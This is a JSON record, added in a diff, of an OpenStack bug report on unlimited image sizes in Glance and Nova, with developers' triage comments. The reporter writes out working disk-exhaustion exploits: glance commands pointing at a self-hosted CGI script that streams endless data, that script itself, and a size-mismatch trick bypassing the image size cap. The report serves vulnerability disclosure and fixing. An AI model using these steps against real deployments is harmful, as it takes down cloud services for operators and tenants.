@@ -1,0 +1,201 @@
+{
+    "status": "Opinion", 
+    "last_updated": "2017-07-04 12:04:05.002402+00:00", 
+    "description": "Using Epel Essex packages on RHEL 6.3\n\nGlance should impose configurable limits (or tenant quotas) on the size of the images it allows to be registered and/or uploaded.\n\nTwo separate example exploits here\n1. Glance Denial of Service by file system exhaustion\n2. Nova Compute Denial of Service by file system exhaustion\n\n= 1 = \n\nUsing the glance x-image-meta-property-copy-from header it is possible to get glance to keep downloading a large resource until it fills up the local harddrive e.g.\n\n$ glance add name=\"big image\" disk_format=raw container_format=ovf copy_from=http://server/cgi-bin/t.cgi # [1]\nFailed to add image. Got error:\nThe request returned a 413 Request Entity Too Large. This generally means that rate limiting or a quota threshold was breached.\n\nThe response body:\n413 Request Entity Too Large\n\nThe body of your request was too large for this server.\n\n Image storage media is full: There is not enough disk space on the image storage media.  \nNote: Your image metadata may still be in the registry, but the image's status will likely be 'killed'.\n\n$ ls -lh /var/lib/glance/images/f1db6d09-1eac-4ce4-86ff-8a34bfea33af\n-rw-r--r--. 1 glance glance 87G Jul 27 13:03 /var/lib/glance/images/f1db6d09-1eac-4ce4-86ff-8a34bfea33af\n$ df -h /var/lib/glance/images/\nFilesystem            Size  Used Avail Use% Mounted on\n/dev/mapper/vg_rheva8c03-lv_root\n                      104G   98G  261M 100% /\n\nthis would allow any authenticated user to preform a denial of service on a glance server, with a file system backend. I havn't looked into swift but will it just keep going until is starts filling up storage nodes?\n\n= 2 = \n\nNova is also open to a similar exploit, by using the x-image-meta-location header in a glance add, a large resource can be registered with glance, any nova compute node that tries to use this image to start an instance can have its disk space very quickly exhausted with a singe instance\n\n# Registering an image 1TB in size (can go bigger if needs be)\n$ glance add name=\"big image\" disk_format=raw container_format=ovf location=http://server/cgi-bin/t.cgi\nAdded new image with ID: 1a528173-7ca9-4320-b0f3-dac127a1f337\n\n$ glance index\nID                                   Name                           Disk Format          Container Format     Size          \n------------------------------------ ------------------------------ -------------------- -------------------- --------------\n1a528173-7ca9-4320-b0f3-dac127a1f337 big image                      raw                  ovf                   1099511627776\n\n$ nova boot --flavor 1 --image 1a528173-7ca9-4320-b0f3-dac127a1f337 bigtest\n\n# the filesystem now fills up, the boot fails and nova deletes the partial download\n# next I check the apache logs to see how much nova downloaded. \n\"GET /cgi-bin/t.cgi HTTP/1.1\" 200 93406637550 \"-\" \"-\"\n# Note : I know I will probably not get the same compute node next time but \n# this will at least give me an idea of what size might be tolerated.\n# edit cgi script [1] to change the content length to something slightly smaller then 93406637550\n$ glance add name=\"smaller big image\" disk_format=raw container_format=ovf location=http://server/cgi-bin/t.cgi\nAdded new image with ID: a5eb1eab-1536-438f-82cf-4b642cf9d363\n$ glance index\nID                                   Name                           Disk Format          Container Format     Size          \n------------------------------------ ------------------------------ -------------------- -------------------- --------------\na5eb1eab-1536-438f-82cf-4b642cf9d363 smaller big image              raw                  ovf                     90406637550\n1a528173-7ca9-4320-b0f3-dac127a1f337 big image                      raw                  ovf                   1099511627776\n\n$ nova boot --flavor 1 --image a5eb1eab-1536-438f-82cf-4b642cf9d363 bigtest_2\n\n$ ls -lh /var/lib/nova/instances/_base/7f9a4e3c2891c537a784391cd962e6a5527d0a27 \n-rw-r--r--. 1 qemu qemu 85G Jul 27 14:13 /var/lib/nova/instances/_base/7f9a4e3c2891c537a784391cd962e6a5527d0a27\n$ df -h /var/lib/nova/instances/_base/\nFilesystem            Size  Used Avail Use% Mounted on\n/dev/mapper/vg_rheva8c03-lv_root\n                      104G   97G  1.1G  99% /\n$\n\n[1] Standard http cgi script used as the vm image\n#!/usr/bin/python\nimport os, sys, uuid\n\nprint \"Content-Type: text/html\"\n#print \"Content-Length: 1099511627776\" # this shouldn't be present for first exploit\nprint\n\ndata = ''.join(uuid.uuid4().hex for a in range(500))\nif os.environ.get('REQUEST_METHOD') == \"GET\":\n    while 1:\n        print data\n        sys.stdout.flush()", 
+    "tags": [
+        "folsom-backport-potential", 
+        "security"
+    ], 
+    "importance": "Medium", 
+    "heat": 12, 
+    "link": "https://bugs.launchpad.net/nova/+bug/1029950", 
+    "owner": "None", 
+    "id": 1029950, 
+    "index": 2987, 
+    "openned": "2012-08-01 11:49:03.385938+00:00", 
+    "created": "2012-07-27 13:50:33.038123+00:00", 
+    "title": "No limits on image size", 
+    "comments": [
+        {
+            "content": "Using Epel Essex packages on RHEL 6.3\n\nGlance should impose configurable limits (or tenant quotas) on the size of the images it allows to be registered and/or uploaded.\n\nTwo separate example exploits here\n1. Glance Denial of Service by file system exhaustion\n2. Nova Compute Denial of Service by file system exhaustion\n\n= 1 = \n\nUsing the glance x-image-meta-property-copy-from header it is possible to get glance to keep downloading a large resource until it fills up the local harddrive e.g.\n\n$ glance add name=\"big image\" disk_format=raw container_format=ovf copy_from=http://server/cgi-bin/t.cgi # [1]\nFailed to add image. Got error:\nThe request returned a 413 Request Entity Too Large. This generally means that rate limiting or a quota threshold was breached.\n\nThe response body:\n413 Request Entity Too Large\n\nThe body of your request was too large for this server.\n\n Image storage media is full: There is not enough disk space on the image storage media.  \nNote: Your image metadata may still be in the registry, but the image's status will likely be 'killed'.\n\n$ ls -lh /var/lib/glance/images/f1db6d09-1eac-4ce4-86ff-8a34bfea33af\n-rw-r--r--. 1 glance glance 87G Jul 27 13:03 /var/lib/glance/images/f1db6d09-1eac-4ce4-86ff-8a34bfea33af\n$ df -h /var/lib/glance/images/\nFilesystem            Size  Used Avail Use% Mounted on\n/dev/mapper/vg_rheva8c03-lv_root\n                      104G   98G  261M 100% /\n\nthis would allow any authenticated user to preform a denial of service on a glance server, with a file system backend. I havn't looked into swift but will it just keep going until is starts filling up storage nodes?\n\n= 2 = \n\nNova is also open to a similar exploit, by using the x-image-meta-location header in a glance add, a large resource can be registered with glance, any nova compute node that tries to use this image to start an instance can have its disk space very quickly exhausted with a singe instance\n\n# Registering an image 1TB in size (can go bigger if needs be)\n$ glance add name=\"big image\" disk_format=raw container_format=ovf location=http://server/cgi-bin/t.cgi\nAdded new image with ID: 1a528173-7ca9-4320-b0f3-dac127a1f337\n\n$ glance index\nID                                   Name                           Disk Format          Container Format     Size          \n------------------------------------ ------------------------------ -------------------- -------------------- --------------\n1a528173-7ca9-4320-b0f3-dac127a1f337 big image                      raw                  ovf                   1099511627776\n\n$ nova boot --flavor 1 --image 1a528173-7ca9-4320-b0f3-dac127a1f337 bigtest\n\n# the filesystem now fills up, the boot fails and nova deletes the partial download\n# next I check the apache logs to see how much nova downloaded. \n\"GET /cgi-bin/t.cgi HTTP/1.1\" 200 93406637550 \"-\" \"-\"\n# Note : I know I will probably not get the same compute node next time but \n# this will at least give me an idea of what size might be tolerated.\n# edit cgi script [1] to change the content length to something slightly smaller then 93406637550\n$ glance add name=\"smaller big image\" disk_format=raw container_format=ovf location=http://server/cgi-bin/t.cgi\nAdded new image with ID: a5eb1eab-1536-438f-82cf-4b642cf9d363\n$ glance index\nID                                   Name                           Disk Format          Container Format     Size          \n------------------------------------ ------------------------------ -------------------- -------------------- --------------\na5eb1eab-1536-438f-82cf-4b642cf9d363 smaller big image              raw                  ovf                     90406637550\n1a528173-7ca9-4320-b0f3-dac127a1f337 big image                      raw                  ovf                   1099511627776\n\n$ nova boot --flavor 1 --image a5eb1eab-1536-438f-82cf-4b642cf9d363 bigtest_2\n\n$ ls -lh /var/lib/nova/instances/_base/7f9a4e3c2891c537a784391cd962e6a5527d0a27 \n-rw-r--r--. 1 qemu qemu 85G Jul 27 14:13 /var/lib/nova/instances/_base/7f9a4e3c2891c537a784391cd962e6a5527d0a27\n$ df -h /var/lib/nova/instances/_base/\nFilesystem            Size  Used Avail Use% Mounted on\n/dev/mapper/vg_rheva8c03-lv_root\n                      104G   97G  1.1G  99% /\n$\n\n[1] Standard http cgi script used as the vm image\n#!/usr/bin/python\nimport os, sys, uuid\n\nprint \"Content-Type: text/html\"\n#print \"Content-Length: 1099511627776\" # this shouldn't be present for first exploit\nprint\n\ndata = ''.join(uuid.uuid4().hex for a in range(500))\nif os.environ.get('REQUEST_METHOD') == \"GET\":\n    while 1:\n        print data\n        sys.stdout.flush()", 
+            "date_created": "2012-07-27 13:50:33.038123+00:00", 
+            "author": "https://api.launchpad.net/1.0/~derekh"
+        }, 
+        {
+            "content": "Adding Brian Waldon and Vish to confirm impact", 
+            "date_created": "2012-07-27 14:01:10.314045+00:00", 
+            "author": "https://api.launchpad.net/1.0/~ttx"
+        }, 
+        {
+            "content": "Actually, Glance caps image data at 1 PiB, assuming it can tell how big an image is. That's probably larger than most systems can handle anyways, so would you just like to make that configurable?", 
+            "date_created": "2012-07-31 21:13:31.376919+00:00", 
+            "author": "https://api.launchpad.net/1.0/~bcwaldon"
+        }, 
+        {
+            "content": "I'm not sure this should be considered a vulnerability in Glance. The current model is that you trust the people you give glance upload access to anyway. They can upload a 1-Pb image. Or they can upload 1000000 1-Gb images. Both would result in the same issue: disk space exhaustion. I'd recommend setting up some billing so that anyone tempted to do that would end up paying for it.\n\nFor Nova, I tend to agree with you there is an attack path. It could definitely use some protection against \"too large\" images. This can be set up at Glance level or at Nova level (at the very minimum when an image uses x-image-meta-location).", 
+            "date_created": "2012-08-01 11:56:14.793584+00:00", 
+            "author": "https://api.launchpad.net/1.0/~ttx"
+        }, 
+        {
+            "content": "Thierry, I want to clarify that it's 1 PiB per image uploaded. I'm thinking that is way too big to be useful, as any reasonable system will be several magnitudes smaller", 
+            "date_created": "2012-08-01 14:39:02.822742+00:00", 
+            "author": "https://api.launchpad.net/1.0/~bcwaldon"
+        }, 
+        {
+            "content": "\nThierry I see your point about billing the customer for space used in glance but I still think glance needs protection from a user exausting all diskspace with one http call. Reducing and fully enforcing the limit on image size will do this and also result in protecting Nova, since all images are download via the API.\n\nIt looks to me like IMAGE_SIZE_CAP needs to be reduced from 1PiB to something more resonable (10GiB maybe?), and also it could be made configurable (or a tenant quota, probably not suitable if back porting to essex is considered).\n\nThen all methods of \"POST /v1/images\" need to respect this value, if passed as a header with the http POST or calculated while it is being uploaded if not in the http headers.\n\nFinally if using the x-image-meta-location: header Glance needs also to respect the image size which was registered for an image, (to protect it from the image size increasing between registration and usage). currlently it reports the size registered when a HTTP HEAD is done against /v1/images/<uuid> but returns the changed size when a HTTP GET is done. So nova downloads the new size (regardless of what was registered)\n", 
+            "date_created": "2012-08-02 09:27:35.484327+00:00", 
+            "author": "https://api.launchpad.net/1.0/~derekh"
+        }, 
+        {
+            "content": "For Glance, I think capping the size of images is a good strengthening measure that should definitely be implemented. I just fail to be convinced that this closes a vulnerability: IMHO it falls in normal usage (yes, you can fill Glance and Swift space if you want to, but should be billed for it). Maybe that's just me, though :)\n\nIt's another story for Nova, which should not be DoSed because Glance lets people do weird things. It should implement its own capping/protection IMHO. The x-image-meta-location is even more convenient to exploit for fun and profit, this is a vulnerability and it should be fixed.\n\nI'd really like to hear others opinions. Russell, Steve, Vish ?", 
+            "date_created": "2012-08-04 09:02:22.537913+00:00", 
+            "author": "https://api.launchpad.net/1.0/~ttx"
+        }, 
+        {
+            "content": "seems like the real bug here is lack of quota enforcement.  We should probably have a quota on disk space usage in both nova and glance (the only exception might be the new swift backend which stores files in each user's container, in which case it is swift's problem). In the short term, a configurable option for max image size makes sense in both nova and glance. Nova might need two, max image size, and max virtual image size.", 
+            "date_created": "2012-08-09 13:54:51.231985+00:00", 
+            "author": "https://api.launchpad.net/1.0/~vishvananda"
+        }, 
+        {
+            "content": "Adding mikal for comment", 
+            "date_created": "2012-08-15 08:24:43.458622+00:00", 
+            "author": "https://api.launchpad.net/1.0/~ttx"
+        }, 
+        {
+            "content": "It seems to me that there are two other things at play here:\n\n - nova-compute shouldn't be fetching images it knows it doesn't have enough disk for, it should be checking and throwing an exception.\n\n - nova-scheduler shouldn't be handing compute nodes jobs they don't have enough disk for.", 
+            "date_created": "2012-08-15 08:26:08.725221+00:00", 
+            "author": "https://api.launchpad.net/1.0/~mikal"
+        }, 
+        {
+            "content": "It does seem like this should be treated as a vulnerability.  I took a look at the security advisories we have done this year, and this seems to be at the same level as some other DOS vulnerabilities we have fixed, including:\n\n[OSSA 2012-003] Long server names grow nova-api log files significantly\n[OSSA 2012-005] No quota enforced on security group\trules\n[OSSA 2012-009] Scheduler denial of service through scheduler_hints\n\nFor nova, I think a cap on image size makes sense.  For glance, is that sufficient to stop someone from filling up disk space?  Is there also a limit on how many images you can upload?", 
+            "date_created": "2012-08-15 20:51:10.311277+00:00", 
+            "author": "https://api.launchpad.net/1.0/~russellb"
+        }, 
+        {
+            "content": "The only limit in glance is the 1 PiB non-configurable max image size. There are no limits on the number of images.", 
+            "date_created": "2012-08-15 21:05:18.051235+00:00", 
+            "author": "https://api.launchpad.net/1.0/~bcwaldon"
+        }, 
+        {
+            "content": "The configurability of the max allowed image size is addressed in https://review.openstack.org/#/c/11627/. It also fixes a problem where chunked transfer-encoding requests weren't getting checked.", 
+            "date_created": "2012-08-20 11:40:22.453158+00:00", 
+            "author": "https://api.launchpad.net/1.0/~bcwaldon"
+        }, 
+        {
+            "content": "Thierry suggested I file a public bug and fix that with the review I just mentioned - https://bugs.launchpad.net/glance/+bug/1038994.\n", 
+            "date_created": "2012-08-20 12:03:08.016631+00:00", 
+            "author": "https://api.launchpad.net/1.0/~bcwaldon"
+        }, 
+        {
+            "content": "Capping in Glance was publicly fixed.\r\nI propose we consider this a vulnerability in Nova only and do an embargoed fix here.\r\n\r\nSteve B., Russell: what do you think ?\r\n\r\nVish, Mikal, Brian: anyone up to propose a Nova fix ? Please attach here.", 
+            "date_created": "2012-08-21 13:09:52.795388+00:00", 
+            "author": "https://api.launchpad.net/1.0/~ttx"
+        }, 
+        {
+            "content": "+1 on the proposal to consider this just a vuln in nova and doing the fix here", 
+            "date_created": "2012-09-06 14:05:27.476030+00:00", 
+            "author": "https://api.launchpad.net/1.0/~russellb"
+        }, 
+        {
+            "content": "Vish, Mikal, Brian: anyone up to propose a Nova fix ? Ideally it would not introduce a new configuration parameter (at least for stable/*)", 
+            "date_created": "2012-09-06 14:12:27.979894+00:00", 
+            "author": "https://api.launchpad.net/1.0/~ttx"
+        }, 
+        {
+            "content": "What fix would be appropriate for Nova? Do we want to check available disk space before any write actions on nova-compute nodes?", 
+            "date_created": "2012-09-06 18:07:34.846659+00:00", 
+            "author": "https://api.launchpad.net/1.0/~bcwaldon"
+        }, 
+        {
+            "content": "Adding nova-core to increase the chances this gets fixed in time for RC1", 
+            "date_created": "2012-09-13 10:15:51.044172+00:00", 
+            "author": "https://api.launchpad.net/1.0/~ttx"
+        }, 
+        {
+            "content": "Eek this is a bit awkward.  I'm not sure how to address this TBH, just some notes...\n\nA related nova commit with inline comments on space checking is\nhttps://review.openstack.org/#/c/11399/3\n\nThe issue would be mitigated somewhat if nova could always\ndo a HEAD first to get the image size, and check/preallocate that.\nBut Derek's point in comment 5 suggests that the GET\nmight in fact get more. In any case I suppose someone could\nstill start high and reduce the size until they got an image that\njust filled the disk.\n\nHaving a max size per image would help, but not if\nusers could use many such images. That would have\nto be enforced by quotas/billing.\n\n", 
+            "date_created": "2012-09-13 11:29:27.335501+00:00", 
+            "author": "https://api.launchpad.net/1.0/~p-draigbrady"
+        }, 
+        {
+            "content": "Anyone with a better suggestion ? Would be great to cover this one before Folsom is out, but the clock is ticking", 
+            "date_created": "2012-09-20 13:44:32.033055+00:00", 
+            "author": "https://api.launchpad.net/1.0/~ttx"
+        }, 
+        {
+            "content": "Guys, would be great to come up with a solution for this.\n\nWe can deny it's a practical attack vector, saying that nova-compute will survive it (\"the filesystem now fills up, the boot fails and nova deletes the partial download\"), or come up with a more creative fix...", 
+            "date_created": "2012-10-03 15:11:54.356240+00:00", 
+            "author": "https://api.launchpad.net/1.0/~ttx"
+        }, 
+        {
+            "content": "Putting back in scope to discuss what to do with this one.", 
+            "date_created": "2014-04-09 12:17:25.660391+00:00", 
+            "author": "https://api.launchpad.net/1.0/~ttx"
+        }, 
+        {
+            "content": "From a nova point of view, the maximum size of the image, is basically CoW base image + max size of disk.\n\nBugs in snapshot management could cause other issues, but we don't appear to be talking about that here.", 
+            "date_created": "2014-11-07 09:09:33.135406+00:00", 
+            "author": "https://api.launchpad.net/1.0/~johngarbutt"
+        }, 
+        {
+            "content": "I'm not sure what's incomplete or invalid here.  Are there now measures in Nova that would prevent this case from happening?\n\nIt seems to be somewhat alleviated by Glance now being able to enforce a maximum size.  But there is no fix for the Nova issue referenced here.", 
+            "date_created": "2014-11-19 20:13:48.596758+00:00", 
+            "author": "https://api.launchpad.net/1.0/~alaski"
+        }, 
+        {
+            "content": "It was my previous comment, I don't understand the concern.\n\nThe max size of the snapshot is generally constrained by the max size of the virtual root disk.\n\nIt might expand bigger than that due to branching in the disk \"snapshot\" chain.I wasn't clear, but I was looking for more detail on how you make that chain grow, such that the size is unbounded.\n\nBut I think I miss-read this. I guess the idea is to check the snapshot size in glance *before* doing the download, in the hope that glance is not lying about the stated size of the snapshot. I know in the XenAPI driver we check the size, but that is post download.", 
+            "date_created": "2014-11-20 10:07:28.256133+00:00", 
+            "author": "https://api.launchpad.net/1.0/~johngarbutt"
+        }, 
+        {
+            "content": "After digging a bit more I do have some questions on the behavior that's reported here.  There is an early check to ensure that the image size is not too large for the flavor being used:\n\n        root_gb = instance_type['root_gb']\n        if root_gb:\n            if int(image.get('size') or 0) > root_gb * (1024 ** 3):\n                raise exception.FlavorDiskTooSmall()\n\nThis gives deployers some protection unless they're creating flavors that can be scheduled to computes which can't handle that disk size.  Or using root_gb = 0.\n\nIt would be great to add some additional protection on computes to ensure that they're not filling their entire filesystem, but I think the impact is somewhat mitigated here.", 
+            "date_created": "2014-12-04 17:50:58.245615+00:00", 
+            "author": "https://api.launchpad.net/1.0/~alaski"
+        }, 
+        {
+            "content": "Ok, it feels like this vulnerability is now a bit shallow. I propose we open it on Thursday and turn it into a security strengthening bug, since it's not really exploitable ?", 
+            "date_created": "2014-12-08 15:36:26.667754+00:00", 
+            "author": "https://api.launchpad.net/1.0/~ttx"
+        }, 
+        {
+            "content": "Its been a while since I looked at this, I'll check to see if the bug that I originally reported is still exploitable, if its not opening it up sounds ok to me.", 
+            "date_created": "2014-12-08 15:52:38.869331+00:00", 
+            "author": "https://api.launchpad.net/1.0/~derekh"
+        }, 
+        {
+            "content": "Confirming this is still relevant, using current trunk I can, register a small image with glance\nglance image-create --location http://192.168.1.4/cgi-bin/t.cgi --disk-format qcow2  --container-format bare --name testimage\n# glance image-list\n| af672331-b29c-405f-a714-3fc2dd8b0110 | testimage | qcow2       | bare             | 19596947  | active |\n\nchange the Content-Length returned by the cgi script and then when I try to start an instance nova will continue to download the image until its disk space is exhausted\nIOError: [Errno 28] No space left on device\nthen the base image is deleted\n\nthis is going through the glance api which isn't respecting the size of the image that was registered with it.\n\nAlso I noticed that the glance image_size_cap can be bypassed by registering a glance image with \"--copy-from\" by arranging for HEAD to return a different Content-Length: to GET\n", 
+            "date_created": "2014-12-09 10:23:26.959452+00:00", 
+            "author": "https://api.launchpad.net/1.0/~derekh"
+        }, 
+        {
+            "content": "Ok, so the real issue here seems to be that it is possible to have Glance provide images which do not conform to the specifications it provides for those images.  There is some hardening that could be done within Nova such as limiting the amount of data downloaded to the image_size specified by Glance.  But I think Glance should look into this as well to see what measures can be implemented there.", 
+            "date_created": "2014-12-09 14:06:01.795170+00:00", 
+            "author": "https://api.launchpad.net/1.0/~alaski"
+        }, 
+        {
+            "content": "So, IIUC as far as Nova is concerned, it's the question of whether we should consider vulnerability to a hostile Glance server as a Nova vulnerability. I suspect there are other types of DoS that can be achieved when Nova is paired with a hostile/taken-over Glance server, so I'm not sure we should include that case in our OSSA attack surface...\n", 
+            "date_created": "2014-12-12 09:47:47.025381+00:00", 
+            "author": "https://api.launchpad.net/1.0/~ttx"
+        }, 
+        {
+            "content": "Proposing class C1 -- if your glance server is taken over, image size should be the least of your concerns.\nhttps://wiki.openstack.org/wiki/Vulnerability_Management#Incident_report_taxonomy", 
+            "date_created": "2015-01-05 15:41:26.440653+00:00", 
+            "author": "https://api.launchpad.net/1.0/~ttx"
+        }, 
+        {
+            "content": "Agreed, this is class C1 (not practically exploitable and so not anything for which we should issue a security advisory). If there are no disagreements, I'll switch this to a regular public bug and mark the security advisory task \"won't fix\" on Thursday.", 
+            "date_created": "2015-01-12 17:59:16.019819+00:00", 
+            "author": "https://api.launchpad.net/1.0/~fungi"
+        }, 
+        {
+            "content": "No disagreement from me.", 
+            "date_created": "2015-01-12 18:51:12.253014+00:00", 
+            "author": "https://api.launchpad.net/1.0/~alaski"
+        }, 
+        {
+            "content": "It's now (UTC) Thursday.", 
+            "date_created": "2015-01-15 00:09:43.279103+00:00", 
+            "author": "https://api.launchpad.net/1.0/~fungi"
+        }
+    ], 
+    "closed": "2015-03-11 18:23:30.902933+00:00"
+}
